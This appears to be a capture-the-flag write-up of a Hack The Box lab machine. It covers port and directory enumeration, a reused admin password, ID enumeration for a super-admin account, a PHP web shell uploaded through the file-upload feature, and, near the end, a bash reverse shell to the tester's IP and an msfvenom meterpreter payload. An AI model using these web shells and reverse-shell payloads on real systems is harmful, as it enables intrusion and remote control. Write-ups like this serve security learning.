# Enumeration

```nmap -sV -O -Pn 10.10.10.28```

![grafik](https://user-images.githubusercontent.com/84674087/127917290-521104b6-f6ae-425d-86ef-910418c5a29a.png)

## 80/TCP Apache 2.4.29

* Take a look at the website, its content and structure
* Most of the clickable items are just fragments (#)
* At the bottom of the site we can find a (non-relevant) phone number
* Maybe the mail address is useful later on?

![grafik](https://user-images.githubusercontent.com/84674087/127917845-f1e7db4f-13e6-4f3d-a6d9-8b353c851023.png)

![grafik](https://user-images.githubusercontent.com/84674087/127917858-4cc16441-9cd8-4bf4-9a04-cdab2f962786.png)

**ffuf**: scans quickly and brings up some sub-dir

`ffuf -c -w /usr/share/wordlists/dirb/big.txt -u http://10.10.10.28/FUZZ`

![grafik](https://user-images.githubusercontent.com/84674087/127919133-925f9dc2-5c35-480e-b654-6c12f003672b.png)


**whatweb**: doesn't provide new insights other than nmap

`whatweb http://10.10.10.28`

**msf**: the aux scanner is not successful in finding new insights!

`msf> auxiliary(scanner/http/apache_userdir_enum)`

**dirb**: shows same results like ffuf, but at much slower pace!

`dirb http://10.10.10.28/`

![grafik](https://user-images.githubusercontent.com/84674087/127919164-ef23cbc8-7d82-401e-bb16-d9b0cf1b9cfd.png)


**nmap**: vuln-script does not reveal new helpful information

`nmap -p 80 --script vuln 10.10.10.28`

**hydra**: 
   * Search for userlist and password list on github
   * https://raw.githubusercontent.com/p-arrow/SecLists/master/Passwords/Common-Credentials/top-passwords-shortlist.txt
   * https://raw.githubusercontent.com/p-arrow/SecLists/master/Usernames/top-usernames-shortlist.txt
   * Craft a suitable hydra command based on “http-form-post"
   * → No success in finding correct password, because “fail parameter” does not exist when invalid login happens

`hydra -l admin -P pw.txt "http-form-post://10.10.10.28:80/cdn-cgi/login:username=^USER^&password=^PASS^:incorrect"`

**nikto**: reveals a login page!

`nikto -host http://10.10.10.28`

![grafik](https://user-images.githubusercontent.com/84674087/127919185-d35a84a9-5788-44f8-9962-7094c1d3a162.png)

![grafik](https://user-images.githubusercontent.com/84674087/127919197-29016afe-5a31-4d45-a23f-0e993e15018a.png)


# Exploitation

**sqlmap**:
   * Open Burpsuite and create a POST request to cdn-cgi/login
   * Save the POST request on your machine (in my case “req.txt”)
   * Try sqlmap with the paramter “password” and “username”
   * Unfortunately without success!

```
sqlmap -r req.txt -p password 
sqlmap -r req.txt -p username
```

![grafik](https://user-images.githubusercontent.com/84674087/127919500-f1f8e0b5-868f-403b-8924-c36e361951ad.png)

![grafik](https://user-images.githubusercontent.com/84674087/127919518-1a76e088-c282-4d53-9231-61f8df1fcbd9.png)


Remember the password from the previous "starting point"-machine ARCHETYPE, which might fit here as well, because the website shows “MegaCorp” in the header ...

Go to login page and enter: 
   * user: administrator
   * password: *MEGACORP_4dm1n!!*
   * SUCCESS!
   * We reach cdn-cgi/login/admin.php

![grafik](https://user-images.githubusercontent.com/84674087/127919842-b16ebe77-1864-419e-81a0-098ec42c2131.png)

When I move to directory “Account”, I recognize id=1 in the URL

![grafik](https://user-images.githubusercontent.com/84674087/127921437-81270440-ca45-4b37-a3dc-e743ea6c0916.png)

Using random numbers higher than 1 discloses another user: John (id=4)!

The directories “Clients” and “Branding” are vulnerable to XSS!

![grafik](https://user-images.githubusercontent.com/84674087/127920131-0f9fb5dd-91dd-4c3f-b0fc-cd487313790f.png)

![grafik](https://user-images.githubusercontent.com/84674087/127920147-06839397-3036-46a3-acda-6ba7bed97618.png)


>  I decided to further examine other potential user accounts via BurpSuite ...

   
* Start Intruder with numeric payload
* Result:
  * id=1 → admin: 34322
  * id=4 → john: 8832
  * id=13 → peter: 57633
  * id=23 → rafol: 28832
  * id=30 → super admin: 86575

![grafik](https://user-images.githubusercontent.com/84674087/127920249-746d6a3e-9939-4633-847d-2748394b3529.png)

![grafik](https://user-images.githubusercontent.com/84674087/127920264-4499520d-b156-4159-835f-cdc836512539.png)


The directory "Uploads” becomes accessible as super admin (it was not when logged in as admin)

![grafik](https://user-images.githubusercontent.com/84674087/127920327-c674888f-d898-45c7-8f1d-1a71c0354ceb.png)


Upload exemplary pw.txt and check if it is accessible from terminal by curl-ing the directory /uploads

![grafik](https://user-images.githubusercontent.com/84674087/127920339-77522d34-a89b-4ffa-abd7-4aac50637849.png)

Next step is the upload of a php file and get access to the webserver via curl

```
<?php
if(isset($_REQUEST['c'])){
        echo "<pre>";
        $c = ($_REQUEST['c']);
        system($c);
        echo "</pre>";
        die;
}
?>
```

`curl http://10.10.10.28/uploads/file.php?c=command`


![grafik](https://user-images.githubusercontent.com/84674087/127920408-5d0b63a2-a431-4d23-885d-0ea07393dcf4.png)

![grafik](https://user-images.githubusercontent.com/84674087/127920425-7ae87c56-c2a4-4c1e-afce-d62412f8935d.png)

The user "robert" looks compelling ...

![grafik](https://user-images.githubusercontent.com/84674087/127920447-21e9b98d-328b-4e9e-9fc6-a12bdc6d1a16.png)

**User Flag**: f2c74ee8db7983851ab2a96a44eb7981 :smiley:


### Alternative #1: Reverse Shell

```
<?php
//backdoor.php
exec("/bin/bash -c 'bash -i > /dev/tcp/10.10.16.79/4321 0>&1'");
?>
```

`curl http://10.10.10.28/uploads/backdoor.php`


### Alternative #2: Meterpreter Session

```
msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.16.79 LPORT=8080 -o paypay.php

msf> exploit/multi/handler 

curl http://10.10.10.28/uploads/paypay.php
```

![grafik](https://user-images.githubusercontent.com/84674087/127920785-a0e3a62c-9f47-4c23-a20b-b09dd6bdd486.png)
